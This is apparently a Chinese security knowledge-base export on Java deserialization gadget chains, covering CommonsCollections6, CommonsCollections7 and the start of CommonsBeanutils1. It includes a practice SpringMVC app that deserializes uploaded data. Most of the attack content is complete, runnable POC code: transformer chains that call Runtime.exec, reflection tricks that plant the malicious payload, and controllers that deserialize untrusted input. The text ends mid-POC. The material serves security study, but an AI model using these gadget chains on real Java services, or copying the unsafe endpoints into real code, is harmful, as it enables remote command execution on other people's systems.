3.1 // ...LazyMap逻辑 // 此处生成的实例为HashMap HashSet map = new HashSet(1); // 此处调用的HashSet的add方法，然后add方法中map为HashMap再调用put方法，此时Entry[] table 为空，且key不为对应的TiedMapEntry实例，不满足条件 map.add(\"foo\"); //那么需要反射将HashMap$Entry[K,V][] table 赋值，且在调用put的时候key为对应的TiedMapEntry实例 // 首先需要从HashSet实例的map值赋到HashMap实例map上，这里反射第一次将HashSet的实例map赋值给HashMap的实例Map Field f = HashSet.class.getDeclaredField(\"map\"); f.setAccessible(true); HashMap innerMap = (HashMap) f.get(map); // 此时 innerMap已经为HashMap实例，这会儿就需要反射HashMap的实例中的table赋值，让其不为null Field f1 = HashMap.class.getDeclaredField(\"table\"); f1.setAccessible(true); // 取值操作，HashMap实例中table的值赋值给一个对象数组 Object[] array = (Object[]) f1.get(innerMap); // 此时这个数据的长度应该只有1，并且对应的值就应该为foo=java.lang.Object@6b7536e7 Object node = array[0]; // 此时最后一步就需要反射取得这个HashMap$Entry的key，并将其赋值为TiedMapEntry的实例 Field keyFiled = node.getClass().getDeclaredField(\"key\"); keyField.setAccessible(true); keyField.set(node, \"TiedMapEntry的实例\"); // 最后再将map序列化成文件 writeObject(map); POC ysoserial（反序列化的HashSet） package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestCC6 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChian = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChian); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"123\"); HashSet map = new HashSet(1); map.add(\"foo\"); Field f = null; try { f = HashSet.class.getDeclaredField(\"map\"); } catch (NoSuchFieldException e) { f = HashSet.class.getDeclaredField(\"backingMap\"); } f.setAccessible(true); HashMap innimpl = (HashMap) f.get(map); Field f2 = null; try { f2 = HashMap.class.getDeclaredField(\"table\"); } catch (NoSuchFieldException e) { f2 = HashMap.class.getDeclaredField(\"elementData\"); } f2.setAccessible(true); Object[] objects = (Object[]) f2.get(innimpl); Object node = objects[0]; if(node == null){ node = objects[1]; } Field keyField = null; try { keyField = node.getClass().getDeclaredField(\"key\"); } catch (Exception e) { keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\"); } keyField.setAccessible(true); keyField.set(node, entry); try { FileOutputStream fileOutputStream = new FileOutputStream(\"cc6.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(map); FileInputStream fileInputStream = new FileInputStream(\"cc6.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } catch (Exception e) { e.printStackTrace(); } } } 更改poc(反序列化HashMap) java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.keyvalue.TiedMapEntry.get() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() 根据ysoserial改写，其实思路都一样 package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class TestCC6_Poc_1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChian = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChian); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); // 直接创建一个HashMap HashMap innimpl = new HashMap(); // HashMap 里一定要有初始值，不然table为空无法获取对应的key innimpl.put(null, \"123\"); Field f2 = null; try { f2 = HashMap.class.getDeclaredField(\"table\"); } catch (NoSuchFieldException e) { f2 = HashMap.class.getDeclaredField(\"elementData\"); } f2.setAccessible(true); Object[] objects = (Object[]) f2.get(innimpl); Object node = objects[0]; Field keyField = null; try { keyField = node.getClass().getDeclaredField(\"key\"); } catch (Exception e) { keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\"); } keyField.setAccessible(true); keyField.set(node, entry); try { FileOutputStream fileOutputStream = new FileOutputStream(\"cc6_1.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(innimpl); // FileInputStream fileInputStream = new FileInputStream(\"cc6_1.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } catch (Exception e) { e.printStackTrace(); } } } 更改POC_1(反序列化HashSet 1次反射) 其实看HashSet这个类的时候，我们可以看到调用add方法的时候，其实传入entry之后，对应的Object就是恶意对象实例，那么就会调用lazymap#get方法，从而在客户端就执行1次命令 具体可以看如下代码，当map.add(entry)之后，就会弹出notepad Transformer[] fakertransformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"notepad.exe\"}) }; Transformer transformerChain = new ChainedTransformer(fakertransformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(entry); 调试一下如上的代码，在add处，传入的是e为entry 在调用hash函数的时候，传入的也是entry 最后调用key(entry).hashcode()这时就会调用TiedMapEntry#hashcode，最后就会调用LazyMap#get方法 那么在客户端执行成功之后，是不行的，因为在LazyMap#get处，会判断map 中是否存在对应的key，如果存在，就不会调用factory.transform // lazymap#get public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } 此时就需要保证在反序列化的时候lazymap中map不能有任何key lazyMap.remove(\"foo\"); 此时还未执行remove操作，可以看到lazymap存在值为foo 执行remove之后，可以看到，lazymap清空了 在ysoserial这个项目中，比如CC1中，都是在最后通过替换ChainedTransformer中的iTransformers为恶意的transformers来完成步骤 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain,transformers); 最后就是序列化与反序列化的步骤 try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cc6_2.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(map); FileInputStream fileInputStream = new FileInputStream(\"cc6_2.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } 完整poc package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestCC6_Poc_2 { public static void main(String[] args) throws Exception { Transformer[] fakertransformers = new Transformer[]{ new ConstantTransformer(1) }; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(fakertransformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(entry); lazyMap.remove(\"foo\"); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain,transformers); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cc6_2.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(map); FileInputStream fileInputStream = new FileInputStream(\"cc6_2.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } 在最后生成了序列化的文件，再将前面的代码注释掉，只留下反序列化的代码，最后只会执行transformers Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:05:09 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/06.CC6/CommonsCollections6分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/07.CC7/CommonsCollections7分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/07.CC7/CommonsCollections7分析.html","title":"CommonsCollections7分析","keywords":"","body":" 简介 链路分析 0x1 0x2 0x3 POC 调试 简介 CC7 也是利用的Commons Collections 3.1 的利用，看ysoserial里的利用链为入口是HashTable，针对HashTable的反序列化，再通过AbstractMap#equals来调用LazyMap#get /* Payload method chain: java.util.Hashtable.readObject java.util.Hashtable.reconstitutionPut org.apache.commons.collections.map.AbstractMapDecorator.equals java.util.AbstractMap.equals org.apache.commons.collections.map.LazyMap.get org.apache.commons.collections.functors.ChainedTransformer.transform org.apache.commons.collections.functors.InvokerTransformer.transform java.lang.reflect.Method.invoke sun.reflect.DelegatingMethodAccessorImpl.invoke sun.reflect.NativeMethodAccessorImpl.invoke sun.reflect.NativeMethodAccessorImpl.invoke0 java.lang.Runtime.exec */ 链路分析 Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\"yy\",1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 2); hashtable.put(lazyMap2, 1); 0x1 CC7 这里有一个知识点，直接看HashTable#put函数，传入的key和value为我们传入的第二个key-value对，在这个函数里，我们可以看到他会判断是否和传入的第一个值是否重复，也就是代码块中第8行到第17行，如果已经存在，就不会再写入hashtable中，如果不存在则会直接写入 在此处可以看到首先会对传入的key（也就是lazymap）进行执行一次hashcode()计算hash值，然后会对比已经存在hashtable的数据的hash是否与我们传入的key.hashCode()是否相等，然后就会调用已存在的lazymap1与传入的lazymap2进行比较 public synchronized V put(K key, V value) { // Make sure the value is not null if (value == null) { throw new NullPointerException(); } // Makes sure the key is not already in the hashtable. Entry tab[] = table; int hash = key.hashCode(); int index = (hash & 0x7FFFFFFF) % tab.length; @SuppressWarnings(\"unchecked\") Entry entry = (Entry)tab[index]; for(; entry != null ; entry = entry.next) { if ((entry.hash == hash) && entry.key.equals(key)) { V old = entry.value; entry.value = value; return old; } } addEntry(hash, key, value, index); return null; } 这里我再补充一下hashCode函数做了什么操作，在下图可以看见，对Key和Value进行Objects.hashCode()之后又做了一次异或，这时就需要保证Objects.hashCode(key1) == Objects.hashCode(key2)，Objects.hashCode(value1) == Objects.hashCode(value2),这样计算出来的hashCode才是相等的，这里我尝试了很多，都没有发现相等的Key，ysoserial的作者给出的 yy 和 zZ hashCode就是相等的 0x2 然后再看equals 函数，这里可以看到传入的object 为lazymap2，当前的this.map 为第一个传入的lazymap1(因为是他调用的equals方法)，然后再跟进equals // AbstractMapDecorator.java public boolean equals(Object object) { return object == this ? true : this.map.equals(object); } 跟进下面代码块第8-24行，这里m为传入的lazymap2，第13行从迭代器里取出来的是已经写入到HashTable里的Entry，然后遍历获取对应的map（因为只有1个，这里就以lazymap1来说明了），获取lazymap1的key以及value，如果value 不为null，这里在22行就存在value.equals(m.get(key))，在这里我们不需要再关注这个equals函数，而是对m.get(key)关注，m为lazymap2，而调用get方法就是我们最终的目的，虽然现在还是在序列化过程中 // AbstractMap public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map m = (Map) o; if (m.size() != size()) return false; try { Iterator> i = entrySet().iterator(); while (i.hasNext()) { Entry e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null && m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } 在序列化过程中，调用了lazymap的get方法之后，返回了value(Object) ， 此时lazymap就多了这个value 0x3 那么在反序列化时，要保证要调用lazymap#get，那么需要保证两个lazymap被hashcode()之后，一定要相等，且调用的是lazymap2#get,那么lazymap2的Transformer factor 就要为执行命令的transformers，也需要将多余的LazyMap删除掉 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; lazyMap2.remove(\"yy\"); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); POC 完整poc如下 package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class TestCC7 { public static void main(String[] args) throws Exception { Transformer[] fackerTransformer = new Transformer[]{}; Transformer transformerChain = new ChainedTransformer(fackerTransformer); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\"yy\",1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 2); hashtable.put(lazyMap2, 1); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); lazyMap2.remove(\"yy\"); try { FileOutputStream fileOutputStream = new FileOutputStream(\"cc7.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(hashtable); FileInputStream fileInputStream = new FileInputStream(\"cc7.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } catch (Exception e) { e.printStackTrace(); } } } 调试 直接在LazyMap#get处打上断点，可以清晰看到对应的反序列化堆栈，就和序列化是一样的，最后把lazymap2里多余的键值对删除，并将其Transformer factor更改为cc1的经典transformers，然后再链式调用即可执行命令 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:05:58 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/07.CC7/CommonsCollections7分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/08.CommonsCollections系列简单靶场.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/08.CommonsCollections系列简单靶场.html","title":"08.CommonsCollections系列简单靶场","keywords":"","body":" 简介 环境 搭建SpringMVC HelloController 相关问题 0x1 接收POST Body 0x2 编码问题 0x3 依赖 参考链接 简介 由于在CC链的学习过程中，是使用的IO操作，模拟网络传输操作，在这里难免会不太理解如果是在web传输过程中，如何实现序列化数据在网络上传输，并且在网络传输过程中，序列化数据（二进制流）与源文件的hash值不等，以及文件特征丢失等等很奇怪的问题，目前找到原因就是编码问题，但是二进制流的会被篡改的问题还没有解决，但是在测试反序列化，就能知道有哪些需要注意的事项了 环境 jdk 8u181 maven 3.8.5 springmvc 4.3.18.RELEASE tomcat 8.5.79 搭建SpringMVC web选取SpringMVC，关于SpringMVC的搭建过程，请参考SpringMVC内存马#创建SpringMVC项目，Tomcat版本为8.5.79，目录结构如下所示 然后整体思路是，通过文件上传，上传已经序列化好的文件（可以通过ysoserial项目创建，也可以自己下载对应的Commons Collections包，进行序列化成文件） 为什么会用文件上传的形式？这个在后面提及，当然还有更好的方式，但是只是为了验证网络传输，所以也就选择了最简单的方式 但是文件上传需要用到中间件，依赖如下，添加到pom.xml中 commons-fileupload commons-fileupload 1.3.1 commons-io commons-io 2.4 并且在dispatcher-servlet.xml里添加bean，配置上传文件的最大值，以及默认的编码方式 HelloController /hi接口是返回前端的文件上传页面，/ysoserial接口则是处理传入的序列化的=数据，然后进行反序列化操作 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.multipart.MultipartFile; import java.io.*; @Controller public class HelloController { @RequestMapping(value = \"/hi\") public String ReturnJsp(){ return \"hello\"; } @RequestMapping(value = \"/ysoserial\") public String SerialTest(@RequestParam(\"file\") MultipartFile f1) throws Exception{ ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(f1.getBytes()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); return \"test\"; } } 启动起来，效果如下： 这里上传对应的已经序列化过后的文件(比如CC7.ser)，即可执行命令 然后将它运行起来之后，就可以看到正常的网络传输过程中，在web中如何反序列化 这个靶场其实很简单，但是在其中的问题很多，所以才会有这一篇文章 在针对上传文件属实有点low了，这里将文件输出成base64编码，然后网络传输传递base64编码，然后再序列化 // Base64EncodeTest package com.myproject; import sun.misc.BASE64Decoder; import sun.misc.BASE64Encoder; import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; public class Base64EncodeTest { public static String encodeBase64File(String path) throws Exception{ File file = new File(path); FileInputStream fileInputStream = new FileInputStream(file); byte[] buffer = new byte[(int) file.length()]; fileInputStream.read(buffer); fileInputStream.close(); return new BASE64Encoder().encode(buffer); } public static void decodeBase64File(String base64Encode,String targetPath) throws Exception{ byte[] buffer = new BASE64Decoder().decodeBuffer(base64Encode); FileOutputStream outputStream = new FileOutputStream(targetPath); outputStream.write(buffer); outputStream.close(); } public static void main(String[] args) throws Exception { String base64Code = encodeBase64File(\"cc7.ser\"); System.out.println(base64Code); } } 然后我们对base64编码的二进制文件，base64解码还原来比较一下sha256 // Base64EncodeTest //... public static void main(String[] args) throws Exception { String base64Code = encodeBase64File(\"cc7.ser\"); decodeBase64File(base64Code,\"cc7base64Decode.ser\"); } 可以发现是hash之后是相等的，那么最后需要更改的就是web接收的参数，为base64字符串，这个字符串当解码之后就是二进制流，需要存放在一个byte数组中，然后再存放在ByteArrayInputStream中，然后使用ObjectInputStream来读取，最后再readObject进行反序列化 byte[] buff = new BASE64Decoder().decodeBuffer(request.getParameter(\"data\")); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(buff); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); 完整的Spring web Controller 如下，对应的接口为/ysoserialBase64 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.multipart.MultipartFile; import sun.misc.BASE64Decoder; import java.io.*; import javax.servlet.http.HttpServletRequest; @Controller public class HelloController { @RequestMapping(value = \"/hi\") public String ReturnJsp(){ return \"hello\"; } @RequestMapping(value = \"/ysoserial\") public String SerialTest(@RequestParam(\"file\") MultipartFile f1) throws Exception{ ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(f1.getBytes()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); return \"test\"; } @RequestMapping(value = \"/ysoserialBase64\") public String SerialBase64Test(HttpServletRequest request) throws IOException, ClassNotFoundException { byte[] buff = new BASE64Decoder().decodeBuffer(request.getParameter(\"data\")); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(buff); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); return \"test\"; } } 在进行传输base64编码的时候，一定要注意，因为base64编码存在+,在web进行传输的时候+会被解码成空格则会导致解码失败，详情参考Base64编码/解码原理，在这里需要将base64编码再进行一次URL编码放在burp里传输，如下所示 相关问题 0x1 接收POST Body 最开始想如Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066)的漏洞利用这样，将反序列化的数据保存到文本文件，然后直接pasted from burp，将文本文件的二进制流传递给web服务器，但是在我使用node.js的时候发现无法接收到来自POST的请求体，因为在express里要接收对应的POST Body，都是由中间件解析完成，然而其实并不想太麻烦，所以最后使用上传文件的方式来将二进制文件流传入给服务端，然后立马就有了编码问题 0x2 编码问题 我在反复尝试后，将经过网络传输的文件保存下来，再利用模拟的IO操作进行反序列化，发现一直无法反序列化成功，因为在模拟IO操作的地方，我发现有crash，CC2本身在反序列化cc2.ser的时候程序就会crash，然后一直没去调试反序列化的过程，在这里浪费了许多时间 排查思路，需要拿到对应的文件进行判断，是否正常 我在这里选择使用node.js，因为轻便(使用java也行，只是我用node比较快)，简单来看一下问题 npm install express --save npm install multer --save const express = require('express') const app = new express() const fs = require('fs') const multer = require('multer') let multerConfig = multer({ dest: './static/upload', }) app.get('/',(req,res)=>{ res.send('hahaha') }) app.post('/',multerConfig.single('file'),(req,res)=>{ console.log(req.file) res.send('get Post') }) app.listen(8081,()=>{ console.log('running!') }) 此时通过burp构造一个multipart/form-data，然后对应将cc2.ser 粘贴到burp里 对其进行sha256，与源文件进行对比，发现并不能对上 并且可以看到如下对比，通过pasted from burp 上传到的文件，已经不符合java 序列化文件的类型了 那到底为什么会出现这种情况？我在Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066)复现过程遇到过，以前是用低版本burp能复现成功，最开始的时候没有探讨原因，后面在北京的时候问过大佬，说是因为编码问题，只要更改为utf-8就可以了，但是我把所有的编码方式都修改了，发现还是不行，包括还是修改对应的16进制码（只修改了一部分），还是不行 然后写了一个静态页面，上传页面，注意后端需要修改同源策略，允许跨域访问 const express = require('express') const app = new express() const fs = require('fs') const multer = require('multer') let multerConfig = multer({ dest: './static/upload', }) app.all('*', function(req, res, next) { res.header('Access-Control-Allow-Origin', req.headers.origin) //需要显示设置来源 // 'Access-Control-Allow-Headers', 'Content-Type' res.header( 'Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization' ) res.header('Access-Control-Allow-Methods', 'POST,GET,DELETE,OPTIONS') res.header('Access-Control-Allow-Credentials', true) //带cookies7 res.header('Content-Type', 'application/json;charset=utf-8') if (req.method == 'OPTIONS') { res.sendStatus(200) } else { next() } }) app.get('/',(req,res)=>{ res.send('hahaha') }) app.post('/',multerConfig.single('file'),(req,res)=>{ console.log(req.file) res.send('get Post') }) app.listen(8081,()=>{ console.log('running!') }) 在此处上传文件发现，通过前端上传的文件，和源文件能相对应上 然后将两个包进行比较，发现序列化数据发生改变了，暂时还不知道如何解决，就是编码问题，从文件里获取的时候，文件内容其实就已经发生了变化 0x3 依赖 在CC链中，我们知道需要特定版本的Commons Collections才能触发反序列化的点，比如Commons Collections 1 需要配合使用JDK1.7 和 Commons Collections 3.1-3.2.1，然而当我直接把本地的jar包放上去之后，调试的时候竟然发现找不到对应的类，这个问题也是高了好久才发现，一直以为是哪个环节出了问题，最后在pom.xml中引入Commons Collections 组件解决问题 org.apache.commons commons-collections4 4.0 commons-collections commons-collections 3.1 参考链接 https://zhuanlan.zhihu.com/p/386631799 Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066) Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:06:35 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/08.CommonsCollections系列简单靶场.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/20.CommonsBeanutils1/":{"url":"知识库/02.JAVA安全/20.CommonsBeanutils1/","title":"20.CommonsBeanutils1","keywords":"","body":" 简介 环境 Tips POC POC_1 简介 Apache Commons Beanutils是 Apache Commons工具集中的另一个项目，它提供对 javaBean 的一些操作，javaBean的用于映射数据库的。 环境 CB1 类似于CC2，利用优先级队列触发comparator的compare方法，其中需要以下依赖 commons-collections commons-collections 3.1 commons-beanutils commons-beanutils 1.9.2 commons-logging commons-logging 1.2 Tips CB1 类似于CC2，在Commons Beanutils中提供对JavaBean的一些操作，在commons.beanutils的BeanComparator类中，实现了Comparator和Serializable接口，如下为BeanComparator#compare方法，当this.property为空的时候，则比较o1,o2两个元素，否则则调用PropertyUtils.getProperty(),当o1为对象A，this.property为name,则此时PropertyUtils.getProperty方法会调用A.getName方法 public int compare(T o1, T o2) { if (this.property == null) { return this.internalCompare(o1, o2); } else { try { Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.internalCompare(value1, value2); } catch (IllegalAccessException var5) { throw new RuntimeException(\"IllegalAccessException: \" + var5.toString()); } catch (InvocationTargetException var6) { throw new RuntimeException(\"InvocationTargetException: \" + var6.toString()); } catch (NoSuchMethodException var7) { throw new RuntimeException(\"NoSuchMethodException: \" + var7.toString()); } } } 在TemplatesImpl中，可以看到在getOutputProperties()方法中，调用了newTransformer()方法， public synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); } catch (TransformerConfigurationException e) { return null; } } 在newTransformer()方法中，调用getTransletInstance()方法，只要_name不为null，_class为null，_bytecode为我们的恶意字节码，那么攻击就能成功 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } 那么总结一下，就是如下几点： BeanComparator@property = outputProperties TemplatesImpl@_name != null TemplatesImpl@_bytecodes = 恶意字节码 queue.length >= 2 queue 需要第一次赋值用于序列化，第二次赋值则是反射将对应的恶意字节码放入对应的队列中 comparator 可以先不用放在构造函数中，最后再反射加入queue实例的成员变量中POC package com.cb1; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.math.BigInteger; import java.util.PriorityQueue; public class TestCB1 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\"+System.nanoTime(); cc.setName(randomName); 